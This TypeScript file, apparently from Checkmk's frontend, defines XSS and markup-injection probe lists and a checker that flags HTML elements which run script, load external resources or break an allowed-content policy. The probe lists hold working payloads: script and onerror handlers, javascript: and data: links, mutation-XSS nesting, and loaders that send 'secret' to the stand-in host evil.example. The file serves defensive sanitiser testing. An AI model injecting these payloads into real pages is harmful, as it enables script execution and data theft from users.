/**
 * Copyright (C) 2026 Checkmk GmbH - License: GNU General Public License v2
 * This file is part of Checkmk (https://checkmk.com). It is subject to the terms and
 * conditions defined in the file COPYING, which is part of this source code package.
 */

export const ACTIVE_MARKUP: readonly string[] = [
  '<script>alert(1)</script>',
  '<ScRiPt>alert(1)</ScRiPt>',
  '<img src="x" onerror="alert(1)">',
  '<p onclick="alert(1)">x</p>',
  '<input autofocus onfocus="alert(1)">',
  '<details open ontoggle="alert(1)">x</details>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JAVASCRIPT:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
  '<a href="https://example.com/" target="x" rel="opener">x</a>',
  '<iframe src="/"></iframe>',
  '<form action="/"><button formaction="/">x</button></form>',
  '<embed src="x"><object data="x"></object>',
  '<svg onload="alert(1)"></svg>',
  '<style>body { display: none }</style>',
  '<p style="position: fixed; inset: 0">x</p>',
  '<span class="hidden">x</span>',
  '<p class="cmk-overlay">x</p>',
  '<link rel="stylesheet" href="https://evil.example/s.css">',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0; url=https://evil.example/">',
  '<style>@import "https://evil.example/c";</style>',
  '<p style="background:url(https://evil.example/b)" background="https://evil.example/b">x</p>',
  '<p style="background:url/**/(https://evil.example/b)">x</p>',
  '<p style="background-image:image-set(\'https://evil.example/i\' 1x)">x</p>',
  '<img src="https://evil.example/?d=secret" srcset="https://evil.example/2x">',
  '<video poster="https://evil.example/p"></video>',
  '<picture><source srcset="https://evil.example/s"></picture>',
  '<img src="data:image/png;base64,AA" srcset="data:image/png;base64,AA 1x, https://evil.example/?d=secret 2x">',
  '<p contenteditable="true">x</p>',
  '<!--<img src=x onerror=alert(1)>-->',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<template><style></template><img src=x onerror=alert(1)></style></template>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>'
]

export const ACTIVE_MARKDOWN: readonly string[] = [
  '[x](javascript:alert(1))',
  '[x]( JaVaScRiPt:alert(1))',
  '[x](vbscript:msgbox(1))',
  '<javascript:alert(1)>',
  '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '![chart](https://evil.example/?d=secret)'
]

type BoundaryProbe = readonly [markup: string, text: string]

export const BOUNDARY_MARKUP: readonly BoundaryProbe[] = [
  ['<a href="ftp://example.com/">x</a>', 'x'],
  ['<a name="x">x</a>', 'x'],
  ['<article>x</article>', 'x'],
  ['<section>x</section>', 'x'],
  ['<dl><dt>x</dt><dd>y</dd></dl>', 'xy'],
  ['<kbd>x</kbd>', 'x'],
  ['<mark>x</mark>', 'x'],
  ['<abbr title="x">y</abbr>', 'y'],
  ['<table><caption>x</caption></table>', 'x'],
  ['<table><tfoot><tr><td>x</td></tr></tfoot></table>', 'x'],
  ['<small>x</small>', 'x'],
  ['<aside>x</aside>', 'x'],
  ['<figure>x</figure>', 'x'],
  ['<cite>x</cite>', 'x'],
  ['<q>x</q>', 'x'],
  ['<time>x</time>', 'x'],
  ['<var>x</var>', 'x']
]

export const BOUNDARY_MARKDOWN: readonly BoundaryProbe[] = [['[x](ftp://example.com/)', 'x']]

const SAFE_PROTOCOLS = ['http:', 'https:', 'mailto:', 'tel:'] as const

export type SafeProtocol = (typeof SAFE_PROTOCOLS)[number]

type OsHandlerProtocol = 'ftp:' | 'ssh:' | 'telnet:' | 'rdp:' | 'vnc:'

export interface SurfacePolicy {
  tags: readonly string[]
  attributes: readonly string[]
  classes: readonly string[] | 'any'
  protocols: readonly SafeProtocol[]
  osHandlerProtocols?: readonly OsHandlerProtocol[]
  sameOriginImageSources?: boolean
  namedTargets?: boolean
}

const ACTIVE_ELEMENTS = [
  'applet',
  'base',
  'button',
  'embed',
  'form',
  'frame',
  'frameset',
  'iframe',
  'input',
  'link',
  'math',
  'meta',
  'object',
  'portal',
  'script',
  'select',
  'style',
  'svg',
  'textarea'
]
const ACTIVE_ATTRIBUTES = ['contenteditable', 'imagesrcset', 'ping', 'srcset']
const LOADING_ATTRIBUTES = ['background', 'dynsrc', 'lowsrc', 'poster', 'src']
const EMBEDDED_IMAGE = /^\s*data:image\//i
const ACTIVE_STYLE = /\b(?:url|image-set|image|src|expression)\s*(?:\(|\/\*)|\\|position/i

const RELATIVE_BASE = new URL('https://surface.invalid/')

function resolved(href: string): URL | undefined {
  try {
    return new URL(href, RELATIVE_BASE)
  } catch {
    return undefined
  }
}

function protocolOf(href: string): string | undefined {
  return resolved(href)?.protocol
}

function isSameOriginImageSource({ localName, ownerElement, value }: Attr): boolean {
  return (
    localName === 'src' &&
    ownerElement?.localName === 'img' &&
    resolved(value)?.origin === RELATIVE_BASE.origin
  )
}

function isListed(protocol: string | undefined, listed: readonly string[]): boolean {
  return protocol !== undefined && listed.includes(protocol)
}

function isActiveAttribute(
  attribute: Attr,
  { osHandlerProtocols = [], sameOriginImageSources = false, namedTargets = false }: SurfacePolicy
): boolean {
  const { name, localName, value } = attribute
  if (name.startsWith('on') || ACTIVE_ATTRIBUTES.includes(name)) {
    return true
  }
  if (localName === 'href') {
    return !isListed(protocolOf(value), [...SAFE_PROTOCOLS, ...osHandlerProtocols])
  }
  if (name === 'target') {
    return value !== '_blank' && !namedTargets
  }
  if (name === 'rel') {
    return value.toLowerCase().split(/\s+/).includes('opener')
  }
  if (LOADING_ATTRIBUTES.includes(name)) {
    return (
      !EMBEDDED_IMAGE.test(value) && !(sameOriginImageSources && isSameOriginImageSource(attribute))
    )
  }
  return name === 'style' && ACTIVE_STYLE.test(value)
}

function isActive(element: Element, policy: SurfacePolicy): boolean {
  return (
    ACTIVE_ELEMENTS.includes(element.localName) ||
    [...element.attributes].some((attribute) => isActiveAttribute(attribute, policy))
  )
}

function isScopedStyleMarker(name: string): boolean {
  return name.startsWith('data-v-')
}

function breaches(
  element: Element,
  { tags, attributes, classes, protocols, osHandlerProtocols = [] }: SurfacePolicy
): boolean {
  return (
    !tags.includes(element.localName) ||
    element
      .getAttributeNames()
      .some((name) => !attributes.includes(name) && !isScopedStyleMarker(name)) ||
    (classes !== 'any' && [...element.classList].some((name) => !classes.includes(name))) ||
    [...element.attributes].some(
      ({ localName, value }) =>
        localName === 'href' && !isListed(protocolOf(value), [...protocols, ...osHandlerProtocols])
    )
  )
}

/**
 * The elements under `root` that run script, load anything, take input or reach
 * past what `policy` lets the surface show.
 */
export function activeContentIn(root: ParentNode, policy: SurfacePolicy): Element[] {
  return [...root.querySelectorAll('*')].filter(
    (element) => isActive(element, policy) || breaches(element, policy)
  )
}

export function inertVHtmlContent(html: string): DocumentFragment {
  const template = document.createElement('template')
  template.innerHTML = html
  return template.content
}
